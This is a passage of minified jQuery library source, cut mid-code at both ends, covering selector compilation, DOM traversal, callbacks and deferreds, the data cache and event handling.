L.apply(a, v) }) } function Ce(e) { for (var t, n, i, o = e.length, a = r.relative[e[0].type], s = a || r.relative[" "], u = a ? 1 : 0, c = me(function (e) { return e === t }, s, !0), f = me(function (e) { return O(t, e) > -1 }, s, !0), p = [function (e, n, r) { var i = !a && (r || n !== l) || ((t = n).nodeType ? c(e, n, r) : f(e, n, r)); return t = null, i }]; u < o; u++)if (n = r.relative[e[u].type]) p = [me(xe(p), n)]; else { if ((n = r.filter[e[u].type].apply(null, e[u].matches))[b]) { for (i = ++u; i < o; i++)if (r.relative[e[i].type]) break; return Te(u > 1 && xe(p), u > 1 && ve(e.slice(0, u - 1).concat({ value: " " === e[u - 2].type ? "*" : "" })).replace(B, "$1"), n, u < i && Ce(e.slice(u, i)), i < o && Ce(e = e.slice(i)), i < o && ve(e)) } p.push(n) } return xe(p) } function Ee(e, t) { var n = t.length > 0, i = e.length > 0, o = function (o, a, s, u, c) { var f, h, y, v = 0, m = "0", x = o && [], b = [], w = l, C = o || i && r.find.TAG("*", c), E = T += null == w ? 1 : Math.random() || .1, k = C.length; for (c && (l = a === d || a || c); m !== k && null != (f = C[m]); m++) { if (i && f) { h = 0, a || f.ownerDocument === d || (p(f), s = !g); while (y = e[h++]) if (y(f, a || d, s)) { u.push(f); break } c && (T = E) } n && ((f = !y && f) && v--, o && x.push(f)) } if (v += m, n && m !== v) { h = 0; while (y = t[h++]) y(x, b, a, s); if (o) { if (v > 0) while (m--) x[m] || b[m] || (b[m] = j.call(u)); b = we(b) } L.apply(u, b), c && !o && b.length > 0 && v + t.length > 1 && oe.uniqueSort(u) } return c && (T = E, l = w), x }; return n ? se(o) : o } return s = oe.compile = function (e, t) { var n, r = [], i = [], o = S[e + " "]; if (!o) { t || (t = a(e)), n = t.length; while (n--) (o = Ce(t[n]))[b] ? r.push(o) : i.push(o); (o = S(e, Ee(i, r))).selector = e } return o }, u = oe.select = function (e, t, n, i) { var o, u, l, c, f, p = "function" == typeof e && e, d = !i && a(e = p.selector || e); if (n = n || [], 1 === d.length) { if ((u = d[0] = d[0].slice(0)).length > 2 && "ID" === (l = u[0]).type && 9 === t.nodeType && g && r.relative[u[1].type]) { if (!(t = (r.find.ID(l.matches[0].replace(Z, ee), t) || [])[0])) return n; p && (t = t.parentNode), e = e.slice(u.shift().value.length) } o = V.needsContext.test(e) ? 0 : u.length; while (o--) { if (l = u[o], r.relative[c = l.type]) break; if ((f = r.find[c]) && (i = f(l.matches[0].replace(Z, ee), K.test(u[0].type) && ge(t.parentNode) || t))) { if (u.splice(o, 1), !(e = i.length && ve(u))) return L.apply(n, i), n; break } } } return (p || s(e, d))(i, t, !g, n, !t || K.test(e) && ge(t.parentNode) || t), n }, n.sortStable = b.split("").sort(D).join("") === b, n.detectDuplicates = !!f, p(), n.sortDetached = ue(function (e) { return 1 & e.compareDocumentPosition(d.createElement("fieldset")) }), ue(function (e) { return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href") }) || le("type|href|height|width", function (e, t, n) { if (!n) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2) }), n.attributes && ue(function (e) { return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value") }) || le("value", function (e, t, n) { if (!n && "input" === e.nodeName.toLowerCase()) return e.defaultValue }), ue(function (e) { return null == e.getAttribute("disabled") }) || le(P, function (e, t, n) { var r; if (!n) return !0 === e[t] ? t.toLowerCase() : (r = e.getAttributeNode(t)) && r.specified ? r.value : null }), oe }(e); w.find = E, w.expr = E.selectors, w.expr[":"] = w.expr.pseudos, w.uniqueSort = w.unique = E.uniqueSort, w.text = E.getText, w.isXMLDoc = E.isXML, w.contains = E.contains, w.escapeSelector = E.escape; var k = function (e, t, n) { var r = [], i = void 0 !== n; while ((e = e[t]) && 9 !== e.nodeType) if (1 === e.nodeType) { if (i && w(e).is(n)) break; r.push(e) } return r }, S = function (e, t) { for (var n = []; e; e = e.nextSibling)1 === e.nodeType && e !== t && n.push(e); return n }, D = w.expr.match.needsContext; function N(e, t) { return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase() } var A = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i; function j(e, t, n) { return g(t) ? w.grep(e, function (e, r) { return !!t.call(e, r, e) !== n }) : t.nodeType ? w.grep(e, function (e) { return e === t !== n }) : "string" != typeof t ? w.grep(e, function (e) { return u.call(t, e) > -1 !== n }) : w.filter(t, e, n) } w.filter = function (e, t, n) { var r = t[0]; return n && (e = ":not(" + e + ")"), 1 === t.length && 1 === r.nodeType ? w.find.matchesSelector(r, e) ? [r] : [] : w.find.matches(e, w.grep(t, function (e) { return 1 === e.nodeType })) }, w.fn.extend({ find: function (e) { var t, n, r = this.length, i = this; if ("string" != typeof e) return this.pushStack(w(e).filter(function () { for (t = 0; t < r; t++)if (w.contains(i[t], this)) return !0 })); for (n = this.pushStack([]), t = 0; t < r; t++)w.find(e, i[t], n); return r > 1 ? w.uniqueSort(n) : n }, filter: function (e) { return this.pushStack(j(this, e || [], !1)) }, not: function (e) { return this.pushStack(j(this, e || [], !0)) }, is: function (e) { return !!j(this, "string" == typeof e && D.test(e) ? w(e) : e || [], !1).length } }); var q, L = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/; (w.fn.init = function (e, t, n) { var i, o; if (!e) return this; if (n = n || q, "string" == typeof e) { if (!(i = "<" === e[0] && ">" === e[e.length - 1] && e.length >= 3 ? [null, e, null] : L.exec(e)) || !i[1] && t) return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e); if (i[1]) { if (t = t instanceof w ? t[0] : t, w.merge(this, w.parseHTML(i[1], t && t.nodeType ? t.ownerDocument || t : r, !0)), A.test(i[1]) && w.isPlainObject(t)) for (i in t) g(this[i]) ? this[i](t[i]) : this.attr(i, t[i]); return this } return (o = r.getElementById(i[2])) && (this[0] = o, this.length = 1), this } return e.nodeType ? (this[0] = e, this.length = 1, this) : g(e) ? void 0 !== n.ready ? n.ready(e) : e(w) : w.makeArray(e, this) }).prototype = w.fn, q = w(r); var H = /^(?:parents|prev(?:Until|All))/, O = { children: !0, contents: !0, next: !0, prev: !0 }; w.fn.extend({ has: function (e) { var t = w(e, this), n = t.length; return this.filter(function () { for (var e = 0; e < n; e++)if (w.contains(this, t[e])) return !0 }) }, closest: function (e, t) { var n, r = 0, i = this.length, o = [], a = "string" != typeof e && w(e); if (!D.test(e)) for (; r < i; r++)for (n = this[r]; n && n !== t; n = n.parentNode)if (n.nodeType < 11 && (a ? a.index(n) > -1 : 1 === n.nodeType && w.find.matchesSelector(n, e))) { o.push(n); break } return this.pushStack(o.length > 1 ? w.uniqueSort(o) : o) }, index: function (e) { return e ? "string" == typeof e ? u.call(w(e), this[0]) : u.call(this, e.jquery ? e[0] : e) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1 }, add: function (e, t) { return this.pushStack(w.uniqueSort(w.merge(this.get(), w(e, t)))) }, addBack: function (e) { return this.add(null == e ? this.prevObject : this.prevObject.filter(e)) } }); function P(e, t) { while ((e = e[t]) && 1 !== e.nodeType); return e } w.each({ parent: function (e) { var t = e.parentNode; return t && 11 !== t.nodeType ? t : null }, parents: function (e) { return k(e, "parentNode") }, parentsUntil: function (e, t, n) { return k(e, "parentNode", n) }, next: function (e) { return P(e, "nextSibling") }, prev: function (e) { return P(e, "previousSibling") }, nextAll: function (e) { return k(e, "nextSibling") }, prevAll: function (e) { return k(e, "previousSibling") }, nextUntil: function (e, t, n) { return k(e, "nextSibling", n) }, prevUntil: function (e, t, n) { return k(e, "previousSibling", n) }, siblings: function (e) { return S((e.parentNode || {}).firstChild, e) }, children: function (e) { return S(e.firstChild) }, contents: function (e) { return N(e, "iframe") ? e.contentDocument : (N(e, "template") && (e = e.content || e), w.merge([], e.childNodes)) } }, function (e, t) { w.fn[e] = function (n, r) { var i = w.map(this, t, n); return "Until" !== e.slice(-5) && (r = n), r && "string" == typeof r && (i = w.filter(r, i)), this.length > 1 && (O[e] || w.uniqueSort(i), H.test(e) && i.reverse()), this.pushStack(i) } }); var M = /[^\x20\t\r\n\f]+/g; function R(e) { var t = {}; return w.each(e.match(M) || [], function (e, n) { t[n] = !0 }), t } w.Callbacks = function (e) { e = "string" == typeof e ? R(e) : w.extend({}, e); var t, n, r, i, o = [], a = [], s = -1, u = function () { for (i = i || e.once, r = t = !0; a.length; s = -1) { n = a.shift(); while (++s < o.length) !1 === o[s].apply(n[0], n[1]) && e.stopOnFalse && (s = o.length, n = !1) } e.memory || (n = !1), t = !1, i && (o = n ? [] : "") }, l = { add: function () { return o && (n && !t && (s = o.length - 1, a.push(n)), function t(n) { w.each(n, function (n, r) { g(r) ? e.unique && l.has(r) || o.push(r) : r && r.length && "string" !== x(r) && t(r) }) }(arguments), n && !t && u()), this }, remove: function () { return w.each(arguments, function (e, t) { var n; while ((n = w.inArray(t, o, n)) > -1) o.splice(n, 1), n <= s && s-- }), this }, has: function (e) { return e ? w.inArray(e, o) > -1 : o.length > 0 }, empty: function () { return o && (o = []), this }, disable: function () { return i = a = [], o = n = "", this }, disabled: function () { return !o }, lock: function () { return i = a = [], n || t || (o = n = ""), this }, locked: function () { return !!i }, fireWith: function (e, n) { return i || (n = [e, (n = n || []).slice ? n.slice() : n], a.push(n), t || u()), this }, fire: function () { return l.fireWith(this, arguments), this }, fired: function () { return !!r } }; return l }; function I(e) { return e } function W(e) { throw e } function $(e, t, n, r) { var i; try { e && g(i = e.promise) ? i.call(e).done(t).fail(n) : e && g(i = e.then) ? i.call(e, t, n) : t.apply(void 0, [e].slice(r)) } catch (e) { n.apply(void 0, [e]) } } w.extend({ Deferred: function (t) { var n = [["notify", "progress", w.Callbacks("memory"), w.Callbacks("memory"), 2], ["resolve", "done", w.Callbacks("once memory"), w.Callbacks("once memory"), 0, "resolved"], ["reject", "fail", w.Callbacks("once memory"), w.Callbacks("once memory"), 1, "rejected"]], r = "pending", i = { state: function () { return r }, always: function () { return o.done(arguments).fail(arguments), this }, "catch": function (e) { return i.then(null, e) }, pipe: function () { var e = arguments; return w.Deferred(function (t) { w.each(n, function (n, r) { var i = g(e[r[4]]) && e[r[4]]; o[r[1]](function () { var e = i && i.apply(this, arguments); e && g(e.promise) ? e.promise().progress(t.notify).done(t.resolve).fail(t.reject) : t[r[0] + "With"](this, i ? [e] : arguments) }) }), e = null }).promise() }, then: function (t, r, i) { var o = 0; function a(t, n, r, i) { return function () { var s = this, u = arguments, l = function () { var e, l; if (!(t < o)) { if ((e = r.apply(s, u)) === n.promise()) throw new TypeError("Thenable self-resolution"); l = e && ("object" == typeof e || "function" == typeof e) && e.then, g(l) ? i ? l.call(e, a(o, n, I, i), a(o, n, W, i)) : (o++, l.call(e, a(o, n, I, i), a(o, n, W, i), a(o, n, I, n.notifyWith))) : (r !== I && (s = void 0, u = [e]), (i || n.resolveWith)(s, u)) } }, c = i ? l : function () { try { l() } catch (e) { w.Deferred.exceptionHook && w.Deferred.exceptionHook(e, c.stackTrace), t + 1 >= o && (r !== W && (s = void 0, u = [e]), n.rejectWith(s, u)) } }; t ? c() : (w.Deferred.getStackHook && (c.stackTrace = w.Deferred.getStackHook()), e.setTimeout(c)) } } return w.Deferred(function (e) { n[0][3].add(a(0, e, g(i) ? i : I, e.notifyWith)), n[1][3].add(a(0, e, g(t) ? t : I)), n[2][3].add(a(0, e, g(r) ? r : W)) }).promise() }, promise: function (e) { return null != e ? w.extend(e, i) : i } }, o = {}; return w.each(n, function (e, t) { var a = t[2], s = t[5]; i[t[1]] = a.add, s && a.add(function () { r = s }, n[3 - e][2].disable, n[3 - e][3].disable, n[0][2].lock, n[0][3].lock), a.add(t[3].fire), o[t[0]] = function () { return o[t[0] + "With"](this === o ? void 0 : this, arguments), this }, o[t[0] + "With"] = a.fireWith }), i.promise(o), t && t.call(o, o), o }, when: function (e) { var t = arguments.length, n = t, r = Array(n), i = o.call(arguments), a = w.Deferred(), s = function (e) { return function (n) { r[e] = this, i[e] = arguments.length > 1 ? o.call(arguments) : n, --t || a.resolveWith(r, i) } }; if (t <= 1 && ($(e, a.done(s(n)).resolve, a.reject, !t), "pending" === a.state() || g(i[n] && i[n].then))) return a.then(); while (n--) $(i[n], s(n), a.reject); return a.promise() } }); var B = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/; w.Deferred.exceptionHook = function (t, n) { e.console && e.console.warn && t && B.test(t.name) && e.console.warn("jQuery.Deferred exception: " + t.message, t.stack, n) }, w.readyException = function (t) { e.setTimeout(function () { throw t }) }; var F = w.Deferred(); w.fn.ready = function (e) { return F.then(e)["catch"](function (e) { w.readyException(e) }), this }, w.extend({ isReady: !1, readyWait: 1, ready: function (e) { (!0 === e ? --w.readyWait : w.isReady) || (w.isReady = !0, !0 !== e && --w.readyWait > 0 || F.resolveWith(r, [w])) } }), w.ready.then = F.then; function _() { r.removeEventListener("DOMContentLoaded", _), e.removeEventListener("load", _), w.ready() } "complete" === r.readyState || "loading" !== r.readyState && !r.documentElement.doScroll ? e.setTimeout(w.ready) : (r.addEventListener("DOMContentLoaded", _), e.addEventListener("load", _)); var z = function (e, t, n, r, i, o, a) { var s = 0, u = e.length, l = null == n; if ("object" === x(n)) { i = !0; for (s in n) z(e, t, s, n[s], !0, o, a) } else if (void 0 !== r && (i = !0, g(r) || (a = !0), l && (a ? (t.call(e, r), t = null) : (l = t, t = function (e, t, n) { return l.call(w(e), n) })), t)) for (; s < u; s++)t(e[s], n, a ? r : r.call(e[s], s, t(e[s], n))); return i ? e : l ? t.call(e) : u ? t(e[0], n) : o }, X = /^-ms-/, U = /-([a-z])/g; function V(e, t) { return t.toUpperCase() } function G(e) { return e.replace(X, "ms-").replace(U, V) } var Y = function (e) { return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType }; function Q() { this.expando = w.expando + Q.uid++ } Q.uid = 1, Q.prototype = { cache: function (e) { var t = e[this.expando]; return t || (t = {}, Y(e) && (e.nodeType ? e[this.expando] = t : Object.defineProperty(e, this.expando, { value: t, configurable: !0 }))), t }, set: function (e, t, n) { var r, i = this.cache(e); if ("string" == typeof t) i[G(t)] = n; else for (r in t) i[G(r)] = t[r]; return i }, get: function (e, t) { return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][G(t)] }, access: function (e, t, n) { return void 0 === t || t && "string" == typeof t && void 0 === n ? this.get(e, t) : (this.set(e, t, n), void 0 !== n ? n : t) }, remove: function (e, t) { var n, r = e[this.expando]; if (void 0 !== r) { if (void 0 !== t) { n = (t = Array.isArray(t) ? t.map(G) : (t = G(t)) in r ? [t] : t.match(M) || []).length; while (n--) delete r[t[n]] } (void 0 === t || w.isEmptyObject(r)) && (e.nodeType ? e[this.expando] = void 0 : delete e[this.expando]) } }, hasData: function (e) { var t = e[this.expando]; return void 0 !== t && !w.isEmptyObject(t) } }; var J = new Q, K = new Q, Z = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/, ee = /[A-Z]/g; function te(e) { return "true" === e || "false" !== e && ("null" === e ? null : e === +e + "" ? +e : Z.test(e) ? JSON.parse(e) : e) } function ne(e, t, n) { var r; if (void 0 === n && 1 === e.nodeType) if (r = "data-" + t.replace(ee, "-$&").toLowerCase(), "string" == typeof (n = e.getAttribute(r))) { try { n = te(n) } catch (e) { } K.set(e, t, n) } else n = void 0; return n } w.extend({ hasData: function (e) { return K.hasData(e) || J.hasData(e) }, data: function (e, t, n) { return K.access(e, t, n) }, removeData: function (e, t) { K.remove(e, t) }, _data: function (e, t, n) { return J.access(e, t, n) }, _removeData: function (e, t) { J.remove(e, t) } }), w.fn.extend({ data: function (e, t) { var n, r, i, o = this[0], a = o && o.attributes; if (void 0 === e) { if (this.length && (i = K.get(o), 1 === o.nodeType && !J.get(o, "hasDataAttrs"))) { n = a.length; while (n--) a[n] && 0 === (r = a[n].name).indexOf("data-") && (r = G(r.slice(5)), ne(o, r, i[r])); J.set(o, "hasDataAttrs", !0) } return i } return "object" == typeof e ? this.each(function () { K.set(this, e) }) : z(this, function (t) { var n; if (o && void 0 === t) { if (void 0 !== (n = K.get(o, e))) return n; if (void 0 !== (n = ne(o, e))) return n } else this.each(function () { K.set(this, e, t) }) }, null, t, arguments.length > 1, null, !0) }, removeData: function (e) { return this.each(function () { K.remove(this, e) }) } }), w.extend({ queue: function (e, t, n) { var r; if (e) return t = (t || "fx") + "queue", r = J.get(e, t), n && (!r || Array.isArray(n) ? r = J.access(e, t, w.makeArray(n)) : r.push(n)), r || [] }, dequeue: function (e, t) { t = t || "fx"; var n = w.queue(e, t), r = n.length, i = n.shift(), o = w._queueHooks(e, t), a = function () { w.dequeue(e, t) }; "inprogress" === i && (i = n.shift(), r--), i && ("fx" === t && n.unshift("inprogress"), delete o.stop, i.call(e, a, o)), !r && o && o.empty.fire() }, _queueHooks: function (e, t) { var n = t + "queueHooks"; return J.get(e, n) || J.access(e, n, { empty: w.Callbacks("once memory").add(function () { J.remove(e, [t + "queue", n]) }) }) } }), w.fn.extend({ queue: function (e, t) { var n = 2; return "string" != typeof e && (t = e, e = "fx", n--), arguments.length < n ? w.queue(this[0], e) : void 0 === t ? this : this.each(function () { var n = w.queue(this, e, t); w._queueHooks(this, e), "fx" === e && "inprogress" !== n[0] && w.dequeue(this, e) }) }, dequeue: function (e) { return this.each(function () { w.dequeue(this, e) }) }, clearQueue: function (e) { return this.queue(e || "fx", []) }, promise: function (e, t) { var n, r = 1, i = w.Deferred(), o = this, a = this.length, s = function () { --r || i.resolveWith(o, [o]) }; "string" != typeof e && (t = e, e = void 0), e = e || "fx"; while (a--) (n = J.get(o[a], e + "queueHooks")) && n.empty && (r++, n.empty.add(s)); return s(), i.promise(t) } }); var re = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source, ie = new RegExp("^(?:([+-])=|)(" + re + ")([a-z%]*)$", "i"), oe = ["Top", "Right", "Bottom", "Left"], ae = function (e, t) { return "none" === (e = t || e).style.display || "" === e.style.display && w.contains(e.ownerDocument, e) && "none" === w.css(e, "display") }, se = function (e, t, n, r) { var i, o, a = {}; for (o in t) a[o] = e.style[o], e.style[o] = t[o]; i = n.apply(e, r || []); for (o in t) e.style[o] = a[o]; return i }; function ue(e, t, n, r) { var i, o, a = 20, s = r ? function () { return r.cur() } : function () { return w.css(e, t, "") }, u = s(), l = n && n[3] || (w.cssNumber[t] ? "" : "px"), c = (w.cssNumber[t] || "px" !== l && +u) && ie.exec(w.css(e, t)); if (c && c[3] !== l) { u /= 2, l = l || c[3], c = +u || 1; while (a--) w.style(e, t, c + l), (1 - o) * (1 - (o = s() / u || .5)) <= 0 && (a = 0), c /= o; c *= 2, w.style(e, t, c + l), n = n || [] } return n && (c = +c || +u || 0, i = n[1] ? c + (n[1] + 1) * n[2] : +n[2], r && (r.unit = l, r.start = c, r.end = i)), i } var le = {}; function ce(e) { var t, n = e.ownerDocument, r = e.nodeName, i = le[r]; return i || (t = n.body.appendChild(n.createElement(r)), i = w.css(t, "display"), t.parentNode.removeChild(t), "none" === i && (i = "block"), le[r] = i, i) } function fe(e, t) { for (var n, r, i = [], o = 0, a = e.length; o < a; o++)(r = e[o]).style && (n = r.style.display, t ? ("none" === n && (i[o] = J.get(r, "display") || null, i[o] || (r.style.display = "")), "" === r.style.display && ae(r) && (i[o] = ce(r))) : "none" !== n && (i[o] = "none", J.set(r, "display", n))); for (o = 0; o < a; o++)null != i[o] && (e[o].style.display = i[o]); return e } w.fn.extend({ show: function () { return fe(this, !0) }, hide: function () { return fe(this) }, toggle: function (e) { return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function () { ae(this) ? w(this).show() : w(this).hide() }) } }); var pe = /^(?:checkbox|radio)$/i, de = /<([a-z][^\/\0>\x20\t\r\n\f]+)/i, he = /^$|^module$|\/(?:java|ecma)script/i, ge = { option: [1, "<select multiple='multiple'>", "</select>"], thead: [1, "<table>", "</table>"], col: [2, "<table><colgroup>", "</colgroup></table>"], tr: [2, "<table><tbody>", "</tbody></table>"], td: [3, "<table><tbody><tr>", "</tr></tbody></table>"], _default: [0, "", ""] }; ge.optgroup = ge.option, ge.tbody = ge.tfoot = ge.colgroup = ge.caption = ge.thead, ge.th = ge.td; function ye(e, t) { var n; return n = "undefined" != typeof e.getElementsByTagName ? e.getElementsByTagName(t || "*") : "undefined" != typeof e.querySelectorAll ? e.querySelectorAll(t || "*") : [], void 0 === t || t && N(e, t) ? w.merge([e], n) : n } function ve(e, t) { for (var n = 0, r = e.length; n < r; n++)J.set(e[n], "globalEval", !t || J.get(t[n], "globalEval")) } var me = /<|&#?\w+;/; function xe(e, t, n, r, i) { for (var o, a, s, u, l, c, f = t.createDocumentFragment(), p = [], d = 0, h = e.length; d < h; d++)if ((o = e[d]) || 0 === o) if ("object" === x(o)) w.merge(p, o.nodeType ? [o] : o); else if (me.test(o)) { a = a || f.appendChild(t.createElement("div")), s = (de.exec(o) || ["", ""])[1].toLowerCase(), u = ge[s] || ge._default, a.innerHTML = u[1] + w.htmlPrefilter(o) + u[2], c = u[0]; while (c--) a = a.lastChild; w.merge(p, a.childNodes), (a = f.firstChild).textContent = "" } else p.push(t.createTextNode(o)); f.textContent = "", d = 0; while (o = p[d++]) if (r && w.inArray(o, r) > -1) i && i.push(o); else if (l = w.contains(o.ownerDocument, o), a = ye(f.appendChild(o), "script"), l && ve(a), n) { c = 0; while (o = a[c++]) he.test(o.type || "") && n.push(o) } return f } !function () { var e = r.createDocumentFragment().appendChild(r.createElement("div")), t = r.createElement("input"); t.setAttribute("type", "radio"), t.setAttribute("checked", "checked"), t.setAttribute("name", "t"), e.appendChild(t), h.checkClone = e.cloneNode(!0).cloneNode(!0).lastChild.checked, e.innerHTML = "<textarea>x</textarea>", h.noCloneChecked = !!e.cloneNode(!0).lastChild.defaultValue }(); var be = r.documentElement, we = /^key/, Te = /^(?:mouse|pointer|contextmenu|drag|drop)|click/, Ce = /^([^.]*)(?:\.(.+)|)/; function Ee() { return !0 } function ke() { return !1 } function Se() { try { return r.activeElement } catch (e) { } } function De(e, t, n, r, i, o) { var a, s; if ("object" == typeof t) { "string" != typeof n && (r = r || n, n = void 0); for (s in t) De(e, s, n, r, t[s], o); return e } if (null == r && null == i ? (i = n, r = n = void 0) : null == i && ("string" == typeof n ? (i = r, r = void 0) : (i = r, r = n, n = void 0)), !1 === i) i = ke; else if (!i) return e; return 1 === o && (a = i, (i = function (e) { return w().off(e), a.apply(this, arguments) }).guid = a.guid || (a.guid = w.guid++)), e.each(function () { w.event.add(this, t, i, r, n) }) } w.event = { global: {}, add: function (e, t, n, r, i) { var o, a, s, u, l, c, f, p, d, h, g, y = J.get(e); if (y) { n.handler && (n = (o = n).handler, i = o.selector), i && w.find.matchesSelector(be, i), n.guid || (n.guid = w.guid++), (u = y.events) || (u = y.events = {}), (a = y.handle) || (a = y.handle = function (t) { return "undefined" != typeof w && w.event.triggered !== t.type ? w.event.dispatch.apply(e, arguments) : void 0 }), l = (t = (t || "").match(M) || [""]).length; while (l--) d = g = (s = Ce.exec(t[l]) || [])[1], h = (s[2] || "").split(".").sort(), d && (f = w.event.special[d] || {}, d = (i ? f.delegateType : f.bindType) || d, f = w.event.special[d] || {}, c = w.extend({ type: d, origType: g, data: r, handler: n, guid: n.guid, selector: i, needsContext: i && w.expr.match.needsContext.test(i), namespace: h.join(".") }, o), (p = u[d]) || ((p = u[d] = []).delegateCount = 0, f.setup && !1 !== f.setup.call(e, r, h, a) || e.addEventListener && e.addEventListener(d, a)), f.add && (f.add.call(e, c), c.handler.guid || (c.handler.guid = n.guid)), i ? p.splice(p.delegateCount++, 0, c) : p.push(c), w.event.global[d] = !0) } }, remove: function (e, t, n, r, i) { var o, a, s, u, l, c, f, p, d, h, g, y = J.hasData(e) && J.get(e); if (y && (u = y.events)) { l = (t = (t || "").match(M) || [""]).length; while (l--) if (s = Ce.exec(t[l]) || [], d = g = s[1], h = (s[2] || "").split(".").sort(), d) { f = w.event.special[d] || {}, p = u[d = (r ? f.delegateType : f.bindType) || d] || [], s = s[2] && new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"), a = o = p.length; while (o--) c = p[o], !i && g !== c.origType || n && n.guid !== c.guid || s && !s.test(c.namespace) || r && r !== c.selector && ("**" !== r || !c.selector) || (p.splice(o, 1), c.selector && p.delegateCount--, f.remove && f.remove.call(e, c)); a && !p.length && (f.teardown && !1 !== f.teardown.call(e, h, y.handle) || w.removeEvent(e, d, y.handle), delete u[d]) } else for (d in u) w.event.remove(e, d + t[l], n, r, !0); w.isEmptyObject(u) && J.remove(e, "handle events") } }, dispatch: function (e) { var t = w.event.fix(e), n, r, i, o, a, s, u = new Array(arguments.length), l = (J.get(this, "events") || {})[t.type] || [], c = w.event.special[t.type] || {}; for (u[0] = t, n = 1; n < arguments.length; n++)u[n] = arguments[n]; if (t.delegateTarget = this, !c.preDispatch || !1 !== c.preDispatch.call(this, t)) { s = w.event.handlers.call(this, t, l), n = 0; while ((o = s[n++]) && !t.isPropagationStopped()) { t.currentTarget = o.elem, r = 0; while ((a = o.handlers[r++]) && !t.isImmediatePropagationStopped()) t.rnamespace && !t.rnamespace.test(a.namespace) || (t.handleObj = a, t.data = a.data, void 0 !== (i = ((w.event.special[a.origType] || {}).handle || a.handler).apply(o.elem, u)) && !1 === (t.result = i) && (t.preventDefault(), t.stopPropagation())) } return c.postDispatch && c.postDispatch.call(this, t), t.result } }, handlers: function (e, t) { var n, r, i, o, a, s = [], u = t.delegateCount, l = e.target; if (u && l.nodeType && !("click" === e.type && e.button >= 1)) for (; l !== this; l = l.parentNode || this)if (1 === l.nodeType && ("click" !== e.type || !0 !== l.disabled)) { for (o = [], a = {}, n = 0; n < u; n++)void 0 === a[i = (r = t[n]).selector + " "] && (a[i] = r.needsContext ? w(i, this).index(l) > -1 : w.find(i, this, null, [l]).length), a[i] && o.push(r); o.length && s.push({ elem: l, handlers: o }) } return l = this, u < t.length && s.push({ elem: l, handlers: t.slice(u) }), s }, addProp: function (e, t) { Object.defineProperty(w.Event.prototype, e, { enumerable: !0, configurable: !0, get: g(t) ? function () { if (this.originalEvent) return t(this.originalEvent) } : function () { if (this.originalEvent) return this.originalEvent[e] }, set: function (t) { Object.defineProperty(this, e, { enumerable: !0, configurable: !0, writable: !0, value: t }) } }) }, fix: function (e) { return e[w.expando] ? e : new w.Event(e) }, special: { load: { noBubble: !0 }, focus: { trigger: function () { if (this !== Se() && this.focus) return this.focus(), !1 }, delegateType: "focusin" }, blur: { trigger: function () { if (this === Se() && this.blur) return this.blur(), !1 }, delegateType: "focusout" }, click: { trigger: function () { if ("checkbox" === this.type && this.click && N(this, "input")) return this.click(), !1 }, _default: function (e) { return N(e.target, "a") } }, beforeunload: { postDispatch: function (e) { void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result) } } } }, w.removeEvent = function (e, t, n) { e.removeEventListener && e.removeEventListener(t, n) }, w.Event = function (e, t) { if (!(this instanceof w.Event)) return new w.Event(e, t); e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? Ee : ke, this.target = e.target && 3 === e.target.nodeType ? e.target.parentNode : e.target, this.currentTarget = e.currentTarget, this.relatedTarget = e.relatedTarget) : this.type = e, t && w.extend(this, t), this.timeStamp = e && e.timeStamp || Date.now(), this[w.expando] = !0 }, w.Event.prototype = { constructor: w.Event, isDefaultPrevented: ke, isPropagationStopped: ke, isImmediatePropagationStopped: ke, isSimulated: !1, preventDefault: function () { var e = this.originalEvent; this.isDefaultPrevented = Ee, e && !this.isSimulated && e.preventDefault() }, stopPropagation: function () { var e = this.originalEvent; this.isPropagationStopped = Ee, e && !this.isSimulated && e.stopPropagation() }, stopImmediatePropagation: function () { var e = this.originalEvent; this.isImmediatePropagationStopped = Ee, e && !this.isSimulated && e.stopImmediatePropagation(), this.stopPropagation() } }, w.each({ altKey: !0, bubbles: !0, cancelable: !0, changedTouches: !0, ctrlKey: !0, detail: !0, eventPhase: !0, metaKey: !0, pageX: !0, pageY: !0, shiftKey: !0, view: !0, "char": !0, charCode: !0, key: !0, keyCode: !0, button: !0, buttons: !0, clientX: !0, clientY: !0, offsetX: !0, offsetY: !0, pointerId: !0, pointerType: !0, screenX: !0, screenY: !0, targetTouches: !0, toElement: !0, touches: !0, which: function (e) { var t = e.button; return null == e.which && we.test(e.type) ? null != e.charCode ? e.charCode : e.keyCode : !e.which && void 0 !== t && Te.test(e.type) ? 1 & t ? 1 : 2 & t ? 3 : 4 & t ? 2 : 0 : e.which } }, w.event.addProp), w.each({ mouseenter: "mouseover", mouseleave: "mouseout", pointerenter: "pointerover", pointerleave: "pointerout" }, function (e, t) { w.event.special[e] = { delegateType: t, bindType: t, handle: function (e) { var n, r = this, i = e.relatedTarget, o = e.handleObj; return i && (i === r || w.contains(r, i)) || (e.type = o.origType, n = o.handler.apply(this, arguments), e.type = t), n } } }), w.fn.extend({ on: function (e, t, n, r) { return De(this, e, t, n, r) }, one: function (e, t, n, r) { return De(this, e, t, n, r, 1) }, off: function (e, t, n) { var r, i; if (e && e.preventDefault && e.handleObj) return r = e.handleObj, w(e.delegateTarget).off(r.namespace ? r.origType + "." + r.namespace : r.origType, r.selector, r.handler), this; if ("object" == typeof e) { for (i in e) this.off(i, t, e[i]); return this } return !1 !== t && "function" != typeof t || (n = t, t = void 0), !1 === n && (n = ke), this.each(function () { w.event.remove(this, e, n, t) }) } }); var Ne = 